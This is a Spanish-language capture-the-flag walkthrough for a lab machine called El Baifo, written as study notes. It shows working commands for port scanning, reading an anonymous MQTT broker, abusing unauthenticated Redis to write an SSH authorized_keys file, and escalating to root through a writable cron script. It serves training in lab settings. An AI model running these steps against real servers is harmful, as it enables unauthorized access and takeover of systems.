---
tags: [ctf, thehackerslabs, linux, walkthrough]
tipo: walkthrough
estado: resuelto
---

# El Baifo — Walkthrough

> [!note] Cómo leer esta nota
> Cada paso lleva: **comando → salida relevante → interpretación → por qué**.
> Las salidas marcadas como *(reconstrucción)* se han reescrito a partir del roadmap de estudio, no son capturas literales.

## Paso 1 — Descubrimiento del host

**Comando**
```bash
arp-scan -I eth0 -g 192.168.56.0/24
nmap -p- --open -sS --min-rate 5000 -n -Pn 192.168.56.157 -oG allPorts
```

**Salida relevante** *(reconstrucción)*
```text
22/tcp   open  ssh
80/tcp   open  http
1883/tcp open  mqtt
6379/tcp open  redis
```

**Interpretación / por qué**
- La presencia de `1883` (MQTT) y `6379` (Redis) es la pista fuerte: son servicios de infraestructura que a menudo quedan sin autenticación.

## Paso 2 — Web y virtual host

**Comando**
```bash
echo "192.168.56.157 elbaifo.thl" | sudo tee -a /etc/hosts
gobuster dir -u http://elbaifo.thl/ -w /usr/share/wordlists/dirb/common.txt
```

**Interpretación / por qué**
- Se resuelve el vhost para no perder contenido servido solo por nombre de host; `gobuster` descarta rutas triviales.

## Paso 3 — MQTT anónimo filtra el usuario

**Comando**
```bash
# Listar temas publicados (broker sin credenciales)
mosquitto_sub -h 192.168.56.157 -t '#' -v
```

**Salida relevante** *(reconstrucción)*
```text
telemetria/pastor01/...  <mensajes>
```

**Interpretación / por qué**
- El broker acepta conexiones **anónimas**. Los temas desvelan el nombre de usuario `pastor01`.
- **Actualización importante:** un usuario filtrado **no** es acceso confirmado; hay que obtener una credencial/clave válida.

## Paso 4 — Redis sin autenticación → escribir `authorized_keys`

**Comando**
```bash
ssh-keygen -t ed25519 -f ./baifo_key -N ''
redis-cli -h 192.168.56.157
```
```text
127.0.0.1:6379> INFO server
127.0.0.1:6379> CONFIG GET dir
127.0.0.1:6379> CONFIG SET dir /home/pastor01/.ssh
127.0.0.1:6379> CONFIG SET dbfilename authorized_keys
127.0.0.1:6379> SET x "\n\n<contenido de baifo_key.pub>\n\n"
127.0.0.1:6379> SAVE
```

**Interpretación / por qué**
- Redis **sin `AUTH`** permite cambiar el directorio y el nombre del fichero de la **persistencia RDB**, y `SAVE` escribe el dump en esa ruta.
- Incrustar la clave pública en el dump (con saltos de línea) escribe un `authorized_keys` válido.

## Paso 5 — SSH como `pastor01`

**Comando**
```bash
chmod 600 ./baifo_key
ssh -i ./baifo_key pastor01@192.168.56.157
id
```

**Salida relevante** *(reconstrucción)*
```text
uid=1000(pastor01) gid=1000(pastor01) ...
```

**Interpretación / por qué**
- La clave privada coincide con la pública incrustada → acceso confirmado.

## Paso 6 — Cron root con script modificable → SUID → root

**Comando**
```bash
# Enumeración de tareas y permisos
crontab -l; cat /etc/crontab; ls -la /etc/cron.*
id; sudo -l
# Búsqueda de SUID
find / -perm -4000 -type f 2>/dev/null
```

**Interpretación / por qué**
- El script que ejecuta el cron de root es **escribible** por `pastor01`: al modificarlo, el siguiente disparo ejecuta nuestro código como root.
- Verificar el resultado con `id` / `echo $EUID` y usar `bash -p` si aplica.

## Qué funcionó

- Atacar servicios de infraestructura (MQTT/Redis) en vez de solo la web.
- Redis para escribir ficheros: camino directo a acceso sin crackear nada.

## Qué falló (y por qué)

- Tratar el nombre de usuario de MQTT como "credencial": no lo es.

## Qué aprendí

- MQTT `#` para suscribirse a todos los temas.
- Persistencia RDB de Redis como **escritura arbitraria de archivos**.
- Diferencia entre **credencial filtrada** y **acceso confirmado**.

## Limpieza

- Restaurar `CONFIG SET dir`/`dbfilename` a sus valores originales y eliminar la clave añadida al `authorized_keys`.
- Recuperar la VM con **snapshot** si el cron/SUID dejó artefactos.
